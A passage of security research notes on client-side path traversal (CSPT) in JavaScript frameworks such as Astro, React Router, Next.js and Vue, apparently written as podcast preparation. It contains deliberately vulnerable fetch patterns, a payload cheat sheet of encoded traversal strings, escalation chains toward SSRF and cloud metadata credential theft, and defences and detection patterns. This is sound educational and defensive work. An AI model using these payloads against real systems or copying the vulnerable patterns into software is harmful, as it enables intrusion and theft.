// /blog/..%2fadmin → slug = "../admin"
const post = await fetch(`https://cms-api.example.com/posts/${slug}`);
---
```

**Pattern 2: Rest param (no encoding needed)**
```astro
---
const { path } = Astro.params;
// /proxy/../../admin → path = "../../admin" (slashes in param)
const response = await fetch(`https://internal-service.local/${path}`);
---
```

**Pattern 3: Island hydration CSPT**
```astro
---
const { id } = Astro.params; // decoded server-side
---
<ProductDetails id={id} client:load />
```
```jsx
// ProductDetails island — hydrates client-side with decoded prop
useEffect(() => {
  fetch(`/api/products/${id}`).then(r => r.json()).then(setData);
  // CSPT fires on hydration if id = "../admin"
}, [id]);
```

#### Astro CVEs

| CVE | Description | Fixed |
|-----|-------------|-------|
| CVE-2025-64765 | Middleware auth bypass via URL encoding | 5.15.8 |
| GHSA-whqg-ppgf-wp8c | Double-encoding bypass for above | 5.15.8+ |
| CVE-2026-25545 | SSRF via x-forwarded-host injection | Patched |

---

## CSPT Cheat Sheet: Payloads Per Framework

### Universal Payloads (work against decoded params in fetch)

```
Plain traversal:     ../../../admin
Encoded slash:       ..%2f..%2fadmin
Encoded dots:        %2e%2e/%2e%2e/admin
Double encoded:      ..%252f..%252fadmin
Tab stripping:       .%09.%09/admin          (browsers strip \t)
Newline stripping:   .%0a./admin             (browsers strip \n)
Backslash:           ..%5c..%5cadmin         (Windows/IIS treats \ as /)
Null byte:           ../admin%00             (truncation on C backends)
Double slash:        //evil.com              (protocol-relative → open redirect)
Query injection:     results?format=admin#   (inject query params, truncate suffix)
Fragment truncation: ../admin%23ignored      (%23 = # → truncates rest)
```

### Framework-Specific Payload Matrix

| Payload | React Router | Next.js | Remix | Vue Router | Nuxt | Angular | SvelteKit | Ember | SolidStart | Astro SSR |
|---------|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| `../admin` in catch-all | Direct | Array join | Direct | Array join | Array join | N/A (`**` only) | Direct | Direct (wildcard) | Direct | Direct |
| `..%2fadmin` in `[param]` | Decoded | 404 or decoded | Decoded | Decoded | Decoded | **Preserved** | Version-dep | Breaks route | Breaks route | **Not decoded** |
| `%2e%2e/admin` | Decoded | Decoded | Decoded | Decoded | Decoded | **Decoded** | Decoded | Decoded | Decoded | Decoded |
| `..%252fadmin` double | Two-step decode | Version-dep | Two-step | Not doc'd | Not doc'd | Double-encodes | Historical | Not doc'd | Not doc'd | CVE bypass |
| `/%61dmin` (encoded letter) | Decoded, matches route | Decoded | Decoded | Decoded | Decoded | Decoded | Decoded | Decoded | Decoded | **CVE-2025-64765** |

### Three Tiers of CSPT Risk by Route Type

**Tier 1 — Highest Risk (catch-all/splat/wildcard):**
- Slashes pass through without encoding — `../../admin` works with NO encoding tricks
- React Router: `path="files/*"` → `params["*"]`
- Next.js: `app/files/[...path]/page.tsx` → `params.path` (array)
- Remix: `routes/files.$.tsx` → `params["*"]`
- Vue Router: `/:pathMatch(.*)*` → `params.pathMatch` (array)
- SvelteKit: `src/routes/files/[...path]/` → `params.path`
- Ember: `{ path: '/*everything' }` → `params.everything`
- SolidStart: `src/routes/files/[...path].tsx` → `params.path`
- Astro: `src/pages/files/[...slug].astro` → `params.slug`

**Tier 2 — Medium Risk (regular dynamic segments):**
- Requires encoded dots `%2e%2e` or encoded slash `%2f` (framework-dependent)
- `[id]`, `:param`, `[slug]` across all frameworks
- Browser may block `%2f` from reaching the router (splits route)

**Tier 3 — Lower Risk (static routes):**
- No dynamic params — no direct CSPT surface
- Still vulnerable to query param CSPT or form input injection

---

## CSPT2CSRF: The Escalation Pattern

From Doyensec's July 2024 research:

| Capability | Traditional CSRF | CSPT2CSRF |
|-----------|:---:|:---:|
| Bypasses anti-CSRF tokens | No | **Yes** (frontend includes them) |
| Bypasses SameSite=Lax | No | **Yes** (same-origin request) |
| Supports GET/PATCH/PUT/DELETE | No (mainly POST) | **Yes** |
| One-click attack | No (needs form) | **Yes** |

**The key insight:** CSPT sends the request FROM the victim's browser context, on the same origin, so all cookies and auth headers are included automatically. The frontend JS handles CSRF tokens because it thinks it's making a legitimate request.

**Real-world chains:**
- CSPT + `dangerouslySetInnerHTML` → Stored XSS
- CSPT + state-changing API endpoint → CSRF bypass
- CSPT + Server Component/Loader → SSRF to internal services
- CSPT + cloud metadata (169.254.169.254) → credential theft

---

## Universal Defenses

```javascript
// Option 1: Allowlist validation (BEST)
function isSafeParam(param: string): boolean {
  return /^[a-zA-Z0-9\-_]+$/.test(param);
}

// Option 2: Re-encode before use (GOOD)
// MUST use encodeURIComponent, NOT encodeURI (encodeURI doesn't encode slashes!)
const safeId = encodeURIComponent(params.id);
fetch(`/api/users/${safeId}`);

// Option 3: URL constructor (SAFE)
const apiUrl = new URL(`/api/users/${params.id}`, window.location.origin);
fetch(apiUrl.toString());

// Option 4: Reject traversal sequences
function noTraversal(param: string): string {
  if (param.includes('..') || param.includes('%2e') || param.includes('%2f')) {
    throw new Error('Invalid parameter');
  }
  return param;
}

// Option 5: Framework-specific param matchers (SvelteKit)
// src/params/safe_id.ts
export function match(param: string): boolean {
  return /^[a-zA-Z0-9-_]+$/.test(param);
}
```

**The `encodeURI` vs `encodeURIComponent` trap:**
```javascript
const userId = "../../admin"; // already decoded by framework

encodeURI(userId)            // "../../admin" ← STILL DANGEROUS (doesn't encode / or .)
encodeURIComponent(userId)   // "..%2F..%2Fadmin" ← SAFE
```

---

## Detection Methodology

### Static Analysis: Source → Sink Grep Patterns

**Sources (framework-specific):**
```javascript
// React Router / Remix
useParams()
params["*"]
params.paramName    // in loader/action

// Next.js
await params        // App Router async
useParams()         // next/navigation

// Vue Router / Nuxt
route.params.xxx
useRoute().params
getRouterParam(event, 'xxx')  // Nuxt server

// Angular
paramMap.get('xxx')
route.snapshot.params

// SvelteKit
params.xxx          // in load functions
$page.params.xxx    // in components

// SolidStart
useParams()

// Astro
Astro.params.xxx
```

**Dangerous sinks:**
```javascript
// Direct CSPT
fetch(`/api/${param}`)
fetch(`${base}/${param}`)
axios.get(`/endpoint/${param}`)
$fetch(`/api/${param}`)      // Nuxt
this.http.get(`/api/${param}`)  // Angular

// XSS amplification
dangerouslySetInnerHTML={{ __html: fetchedData }}
element.innerHTML = fetchedData
v-html="fetchedData"         // Vue

// SSRF (server-side contexts)
fetch(`http://internal/${param}`)    // Next.js Server Component
fetch(`http://internal/${param}`)    // Remix loader
$fetch(`http://internal/${param}`)   // Nuxt server route
```

### Dynamic Detection

1. **Doyensec CSPTBurpExtension** — PortSwigger BApp Store, passive CSPT detection
2. **Browser DevTools** — Monitor fetch/XHR, check if URL segments from page URL appear in fetch paths
3. **Automated:** Monitor `fetch`/`XHR` via `chrome.webRequest.onBeforeRequest`, extract path segments from current URL, flag partial matches in fetch requests

---

## Podcast Talking Points (Organized by Topic Flow)

### Opening: "What is CSPT and why should bug bounty hunters care?"

1. **CSPT is the new CSRF.** Doyensec proved in July 2024 that CSPT bypasses anti-CSRF tokens, SameSite cookies, and works with all HTTP methods. Traditional CSRF is dying; CSPT2CSRF is the replacement.

2. **Every framework decodes params.** React Router, Vue Router, SvelteKit, Nuxt, SolidStart — all of them run `decodeURIComponent` on URL params before your code sees them. The framework does the attacker's work.

3. **`fetch()` is the weapon, the browser is the trigger.** `fetch('/api/users/../../admin')` — the browser normalizes that to `GET /api/admin`. Not the framework. Not the server. The browser.

### Middle: "How does this differ across frameworks?" (The Technical Meat)

4. **Vue vs Angular — opposite philosophies.** Vue decodes everything in `route.params` (most exploitable). Angular preserves `%2F` in paramMap because it splits on literal `/` first (different attack surface). But Angular still decodes dots — `%2e%2e` becomes `..` in both.

5. **The catch-all route is the universal CSPT amplifier.** Every framework's `[...path]` / `*` / `/*wildcard` captures slashes. `../../admin` works without ANY encoding tricks. Developers use catch-all routes for file browsers, proxies, documentation — high-value targets.

6. **React Router's double-decode pipeline.** `matchRoutes()` decodes once with `safelyDecodeURI`, then `matchPath()` decodes again with `safelyDecodeURIComponent`. So `%252f` → `%2f` → `/`. Double-encoding bypass works.

7. **Astro's `decodeURI()` vs everyone else's `decodeURIComponent()`.** Astro doesn't decode slashes — but it decodes letters. CVE-2025-64765 uses `/%61dmin` (encoded `a`) to bypass middleware. Then the fix was bypassed with `/%2561dmin` (double-encoded). The cycle continues.

8. **SSR vs SSG is a security model boundary.** Astro SSG = build-time params, no CSPT. Astro SSR = runtime user input, full CSPT. Migrating from SSG to SSR without reviewing param usage introduces CSPT.

### Escalation: "When CSPT becomes SSRF"

9. **Server Components/Loaders turn CSPT into SSRF.** Next.js Server Components, Remix loaders, SvelteKit `+page.server.ts`, Nuxt server routes, SolidStart `'use server'` functions — all execute `fetch()` on the server with internal credentials and network access. Cloud metadata (169.254.169.254), Kubernetes API, internal Redis — those are the real targets.

10. **Nuxt's stored CSPT (CVE-2025-59414) is the scariest pattern.** Not router param CSPT — attacker-controlled data gets prerendered into a page, then the client revival system fetches attacker-controlled paths. The attack is baked into the HTML.

### Closing: "The three soundbites"

11. **"React Router decodes params before giving them to you — by design."** Since PR #9477, `useParams()` returns decoded strings. `..%2f` → `../`. The framework does the attacker's job.

12. **"In Next.js and Remix, client-side path traversal is server-side request forgery."** The "client-side" label doesn't apply to the server-rendered half of modern React. Server Components + decoded params + internal `fetch()` = SSRF with service credentials.

13. **"The double-encoding bypass is universal."** Single-encode fix → bypass with `%252f`. Astro proved it. Angular's `router.navigate()` double-encodes. React Router's pipeline double-decodes. The fix: decode once, reject any remaining `%xx` sequences.

### Bonus: "What's empirically unverified?"

14. **Flag for testing:** Several normalization claims come from GitHub issues and docs, not empirical testing. Specifically:
    - Angular's exact `%2e%2e` behavior in paramMap needs lab verification
    - SolidStart's catch-all param encoding behavior is inferred from solid-router source, not documented
    - Ember's current (post-Octane) encoding behavior with wildcard routes needs verification
    - Double-encoding behavior in Vue Router and Nuxt needs empirical confirmation
    - Astro's Node adapter `%2f` rejection behavior varies by Node.js version

---

## Complete CVE Reference

| CVE | Framework | CVSS | Type | Key Detail |
|-----|-----------|------|------|-----------|
| CVE-2025-55182 | React 19 RSC | 10.0 | RCE | React2Shell — prototype chain to Function constructor |
| CVE-2025-66478 | Next.js App Router | 10.0 | RCE | Downstream React2Shell |
| CVE-2025-29927 | Next.js | 9.1 | Auth Bypass | x-middleware-subrequest skips middleware |
| CVE-2025-43864 | React Router 7 | 8.2 | Cache Poison | X-React-Router-SPA-Mode header |
| CVE-2025-43865 | React Router 7 | 8.2 | Data Spoof | X-React-Router-Prerender-Data header |
| CVE-2025-31137 | React Router/Remix | 7.5 | DoS | X-Forwarded-Host port injection → cache poison |
| CVE-2025-55184 | React RSC | 7.5 | DoS | Infinite loop via crafted request |
| CVE-2025-67647 | SvelteKit | High | SSRF+DoS | decode_pathname vs url.pathname discrepancy |
| CVE-2025-64765 | Astro | Medium | Auth Bypass | Middleware bypass via URL encoding |
| GHSA-whqg-ppgf-wp8c | Astro | Medium | Auth Bypass | Double-encoding bypass for above |
| CVE-2026-25545 | Astro | High | SSRF | x-forwarded-host injection |
| CVE-2026-22803 | SvelteKit | Medium | DoS | Remote functions |
| CVE-2025-15265 | Svelte (core) | Medium | XSS | Experimental hydratable |
| CVE-2025-59414 | Nuxt 3 | Low | CSPT | Island payload revival stored CSPT |
| CVE-2025-27415 | Nuxt 3 | Medium | DoS | Cache poisoning via payload route regex |
| CVE-2024-23657 | Nuxt DevTools | Medium | Path Traversal | Missing auth + WebSocket origin check |
| CVE-2024-34344 | Nuxt | High | RCE | TestComponentWrapper path bypass |
| CVE-2025-68470 | React Router | TBD | Open Redirect | Unsafe navigation API |
| CVE-2026-22029 | React Router | TBD | XSS | Loader redirect with untrusted input |
| CVE-2026-21884 | React Router | TBD | XSS | ScrollRestoration XSS |
| CVE-2026-22030 | React Router 7 | TBD | CSRF | Cross-origin form submissions |
| CVE-2025-61686 | @react-router/node | TBD | Path Traversal | Node adapter directory traversal |
| CVE-2025-55183 | React RSC | 5.3 | Info Disclosure | Server Function source code leak |
| CVE-2020-5284 | Next.js <9.3.2 | N/A | Path Traversal | `/_next/` directory traversal |
| Ember #3971 | Ember Data | N/A | Design Issue | Custom adapter path traversal |
| Ember #11497 | Ember Router | N/A | Design Issue | Model ID not encoded in URLs |

---

## Sources

### Research Papers & Blog Posts
- [Doyensec CSPT2CSRF](https://blog.doyensec.com/2024/07/02/cspt2csrf.html) — Original CSPT2CSRF research (July 2024)
- [Matan Berson — CSPT Encoding Levels](https://matanber.com/blog/cspt-levels) — Encoding level model
- [zhero — SvelteKit SSRF](https://zhero-web-sec.github.io/research-and-things/avoiding-the-paradox-a-native-full-read-ssrf-and-oneshot-dos-in-sveltekit) — CVE-2025-67647
- [zhero — Astro Standards Weaponization](https://zhero-web-sec.github.io/research-and-things/astro-framework-and-standards-weaponization) — CVE-2025-64765
- [zhero — React Router Remixed Path](https://zhero-web-sec.github.io/research-and-things/react-router-and-the-remixed-path) — CVE-2025-31137
- [Vitor Falcao — $7500 CSPT bounty](https://vitorfalcao.com/posts/hacking-high-profile-targets/) — Real-world CSPT
- [Vitor Falcao — Automating CSPT](https://vitorfalcao.com/posts/automating-cspt-discovery/) — Detection automation
- [ProjectDiscovery — CVE-2025-29927](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass) — Next.js middleware bypass
- [Assetnote — SSRF in NextJS](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) — Next.js SSRF patterns
- [PayloadsAllTheThings CSPT](https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/) — Payload reference
- [CSPTPlayground by Doyensec](https://github.com/doyensec/CSPTPlayground) — Interactive examples
- [CSPT Practical CTF Reference](https://book.jorianwoltjer.com/web/client-side/client-side-path-traversal-cspt) — CTF-oriented guide

### Framework CVE Advisories
- [Next.js Security Update Dec 2025](https://nextjs.org/blog/security-update-2025-12-11)
- [Next.js CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)
- [React — React2Shell Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [SvelteKit CVEs](https://svelte.dev/blog/cves-affecting-the-svelte-ecosystem)
- [Netlify — 6 React Router CVEs](https://www.netlify.com/changelog/2026-01-15-react-router-remix-security-vulnerabilities/)
- [Netlify — SvelteKit Vulnerabilities](https://www.netlify.com/changelog/2026-01-15-sveltekit-security-vulnerabilities/)
- [Astro CVE-2025-64765 Advisory](https://github.com/advisories/GHSA-ggxq-hp9w-j794)
- [Astro CVE Bypass Advisory](https://github.com/withastro/astro/security/advisories/GHSA-whqg-ppgf-wp8c)
- [React Router GHSA-2w69-qvjg-hvjx](https://github.com/remix-run/react-router/security/advisories/GHSA-2w69-qvjg-hvjx)
- [Nuxt CVE-2025-59414](https://github.com/advisories/GHSA-p6jq-8vc4-79f6)

### GitHub Issues (Encoding Behavior)
- [React Router #7173](https://github.com/ReactTraining/react-router/issues/7173) — Parameter encoding v6
- [React Router #10814](https://github.com/remix-run/react-router/issues/10814) — Double decode bug
- [React Router #11940](https://github.com/remix-run/react-router/issues/11940) — generatePath/matchPath asymmetry
- [React Router #11109](https://github.com/remix-run/react-router/issues/11109) — useParams decoding
- [React Router PR #9477](https://github.com/remix-run/react-router/pull/9477) — Fix encoding/matching
- [history PR #656](https://github.com/ReactTraining/history/pull/656) — Remove pathname decoding
- [Remix #8328](https://github.com/remix-run/remix/issues/8328) — Loader params encoding
- [Remix #8004](https://github.com/remix-run/remix/discussions/8004) — URI encoding practices
- [Vue Router #2187](https://github.com/vuejs/router/issues/2187) — Hash fragment %2F wontfix bug
- [Vue Router #2953](https://github.com/vuejs/router/issues/2953) — Slash encoding confirmation
- [Angular #50950](https://github.com/angular/angular/issues/50950) — routerLink double-encoding
- [SvelteKit #3069](https://github.com/sveltejs/kit/issues/3069) — % encoding double-decode
- [Astro #8516](https://github.com/withastro/astro/issues/8516) — URL encoded params
- [Ember #3971](https://github.com/emberjs/data/issues/3971) — Adapter path traversal
- [Ember #11497](https://github.com/emberjs/ember.js/issues/11497) — Model ID encoding
- [Ember #4794](https://github.com/emberjs/ember.js/issues/4794) — Dynamic segments encoding
- [Ember #14094](https://github.com/emberjs/ember.js/issues/14094) — link-to special chars
- [SolidStart #551](https://github.com/solidjs/solid-start/discussions/551) — Server action params
- [Next.js #54325](https://github.com/vercel/next.js/issues/54325) — URL-decoded 404 regression

### Official Documentation
- [React Router Docs](https://reactrouter.com/)
- [Next.js Dynamic Routes](https://nextjs.org/docs/app/api-reference/file-conventions/dynamic-routes)
- [Next.js useParams](https://nextjs.org/docs/app/api-reference/functions/use-params)
- [Remix File Route Conventions](https://remix.run/docs/en/main/file-conventions/routes)
- [Vue Router Matching Syntax](https://router.vuejs.org/guide/essentials/route-matching-syntax)
- [Angular Router Guide](https://angular.dev/guide/routing)
- [SvelteKit Advanced Routing](https://svelte.dev/docs/kit/advanced-routing)
- [SvelteKit Load](https://svelte.dev/docs/kit/load)
- [Astro Routing](https://docs.astro.build/en/guides/routing/)
- [SolidStart Routing](https://docs.solidjs.com/solid-start/building-your-application/routing)
- [Ember.js Routing](https://guides.emberjs.com/release/routing/)
